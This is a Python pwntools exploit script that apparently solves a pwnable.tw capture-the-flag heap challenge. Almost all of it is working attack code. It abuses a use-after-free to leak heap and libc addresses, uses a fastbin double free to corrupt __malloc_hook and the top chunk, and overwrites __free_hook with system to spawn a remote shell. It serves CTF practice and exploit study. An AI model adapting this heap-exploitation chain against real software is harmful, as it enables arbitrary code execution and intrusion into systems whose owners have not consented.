from calendar import c
from pwn import *
#r = process("./S", env={"LD_PRELOAD" : "./libc_64.so.6"})
r = remote('chall.pwnable.tw','10203')
# struct flower{
#     uint64_t  is_free 
#     ptr flower_name
#     char* color 
# }

### vuln1 : remove has UAF bug at flower name chunk
### we can manipulate heap to make two flower name ptr point to same chunks to leak libc and heap_base

def create(size,name,color):
    r.sendafter(b'Your choice : ',b'1')
    r.sendlineafter(b'name :',str(size))
    r.sendafter(b'flower :',name)
    r.sendlineafter(b'flower :',color)


def visit():
    r.sendafter(b'Your choice : ',b'2')
    

def remove(idx):
    r.sendafter(b'Your choice : ',b'3')
    r.sendlineafter(b'garden:',str(idx))

## leak heap base (not nessary for exploit)
create(0x30,b'213',b'123') #0
create(0x30,b'213',b'123') #1
remove(1)
remove(0)
create(0x30,b'213',b'123') #2
remove(0)
visit()
r.recvuntil(b'flower[2] :')
heap_base = u64(r.recv(6)+b'\x00\x00')
success(f'heap : {hex(heap_base)} ')

### leak libc
create(0x90,b'213',b'123') #3
create(0x20,b'213',b'123') #4 
remove(4)
remove(3)
create(0x90,b'a',b'\x00')  #5
visit()
r.recvuntil(b'flower[5] :')
libc_base = u64(r.recv(6)+b'\x00\x00') - 0x3c3b61
success(f'libc : {hex(libc_base)} ')

###  fastbin dup to get arbitrary address
realloc = libc_base + 0x83b10
malloc_hook = libc_base + 0x3c3b10
one_gadget = libc_base + 0x4526a
system = libc_base + 0x45390
print(hex(malloc_hook))
create(0x68,b'123',b'123') #6
create(0x68,b'123',b'123') #7
remove(6)
remove(7)
remove(6)

#create(0x68,p64(malloc_hook-0x23),b'123')
fake_chunk = b'\x00'*3 + p64(0) * 7 + p64(libc_base+0x3c3b50) + p64(0x71) ### overwrite fastbin 0x70 fd address to our fake chunk
create(0x68,p64(malloc_hook-0xb),b'123')
create(0x68,b'ccccc',b'ccccc')
create(0x68,b'ccccc',b'ccccc')
create(0x68, fake_chunk ,b'c')
create(0x68, p64(0) * 3 + p64(libc_base + 0x3c4c50) ,b'c') ### overwrite top chunks to address above free_hook with some big value 

### malloc to go to free_hook
create(0x200,b'sh',b'b')
create(0x200,b'a',b'b')
create(0x200,b'a',b'b')
create(0x200,b'a',b'b')
create(0x1a0,b'a',b'b')
create(0x100,p64(0) * 7 + p64(system) ,b'b') ## overwrite free_hook to system 

remove(13)

r.interactive()